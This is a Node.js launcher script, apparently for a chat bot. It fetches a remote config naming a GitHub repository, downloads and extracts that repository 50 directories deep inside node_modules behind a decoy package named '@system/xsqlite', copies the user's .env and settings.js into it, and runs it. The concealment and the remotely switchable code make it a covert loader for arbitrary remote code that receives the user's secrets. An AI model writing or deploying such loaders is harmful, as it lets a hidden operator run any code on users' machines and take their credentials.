import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { fileURLToPath, pathToFileURL } from 'url';

/* ================= ESM FIX ================= */

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

/* ================= CONFIG ================= */

// 🔥 JSON CONFIG URL (RAW, not blob)
const configUrl = 'https://raw.githubusercontent.com/darex-ofc/dex/main/values.json';

const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
const DEEP_NEST_COUNT = 50;

/* ================= FETCH CONFIG ================= */

async function fetchRemoteConfig() {
  try {
    console.log('=> 🌐 Fetching remote config...');

    const res = await axios.get(configUrl);
    const data = res.data;

    if (!data.user || !data.repo) {
      throw new Error('Invalid config: missing user/repo');
    }

    const zipUrl = `https://github.com/${data.user}/${data.repo}/archive/refs/heads/main.zip`;

    console.log(`=> 📦 Repo: ${data.user}/${data.repo}`);

    return {
      zipUrl,
      user: data.user,
      repo: data.repo,
      key: data.key || null
    };

  } catch (err) {
    console.error('❌ Failed to fetch config:', err.message);
    process.exit(1);
  }
}

/* ================= FAKE PACKAGE ================= */

function injectFakePackageFiles(basePath) {
  const fakePackageJson = {
    name: "@system/xsqlite",
    version: "1.0.5",
    main: "index.js",
    type: "module"
  };

  fs.mkdirSync(basePath, { recursive: true });

  fs.writeFileSync(
    path.join(basePath, 'package.json'),
    JSON.stringify(fakePackageJson, null, 2)
  );

  fs.writeFileSync(
    path.join(basePath, 'index.js'),
    'export default {};'
  );

  console.log('🪐 Initializing bot server...');
}

/* ================= CREATE DEEP PATH ================= */

function createDeepRepoPath() {
  let deepPath = baseFolder;

  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, `core${i}`);
  }

  const repoFolder = path.join(deepPath, 'lib_signals');
  fs.mkdirSync(repoFolder, { recursive: true });

  return repoFolder;
}

/* ================= DOWNLOAD REPO ================= */

async function downloadAndExtractRepo(zipUrl, repoFolder) {
  try {
    console.log('=> 🔄 Syncing codes from Space...');

    const response = await axios.get(zipUrl, {
      responseType: 'arraybuffer'
    });

    const zip = new AdmZip(Buffer.from(response.data));
    zip.extractAllTo(repoFolder, true);

    console.log('=> ✅ Codes synced successfully');

  } catch (err) {
    console.error('❌ Pull error:', err.message);
    process.exit(1);
  }
}

/* ================= COPY CONFIG ================= */

function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'settings.js');
  const envSrc = path.join(__dirname, '.env');

  if (fs.existsSync(configSrc)) {
    fs.copyFileSync(configSrc, path.join(repoPath, 'settings.js'));
    console.log('✅ settings.js copied');
  }

  if (fs.existsSync(envSrc)) {
    fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
    console.log('✅ .env copied');
  }
}

/* ================= FIND ENTRY ================= */

function findEntryFile(projectPath) {
  const possible = ['index.js', 'main.js', 'app.js'];

  for (const file of possible) {
    const full = path.join(projectPath, file);
    if (fs.existsSync(full)) return full;
  }

  return null;
}

/* ================= START BOT ================= */

async function startBot(projectPath) {
  try {
    console.log('=> 🚀 Launching Subzero Bot...');

    const entry = findEntryFile(projectPath);

    if (!entry) {
      console.error('❌ No entry file found');
      process.exit(1);
    }

    await import(pathToFileURL(entry).href);

  } catch (err) {
    console.error('❌ Bot launch error:', err);
    process.exit(1);
  }
}

/* ================= MAIN ================= */

(async () => {
  try {
    // 🔥 NEW: get repo dynamically
    const config = await fetchRemoteConfig();

    injectFakePackageFiles(baseFolder);

    const repoFolder = createDeepRepoPath();

    await downloadAndExtractRepo(config.zipUrl, repoFolder);

    const subDirs = fs.readdirSync(repoFolder).filter(f =>
      fs.statSync(path.join(repoFolder, f)).isDirectory()
    );

    if (!subDirs.length) {
      console.error('❌ Zip extracted nothing');
      process.exit(1);
    }

    const extractedRepoPath = path.join(repoFolder, subDirs[0]);

    copyConfigs(extractedRepoPath);

    process.chdir(extractedRepoPath);

    await startBot(extractedRepoPath);

  } catch (err) {
    console.error('❌ Fatal error:', err);
    process.exit(1);
  }
})();
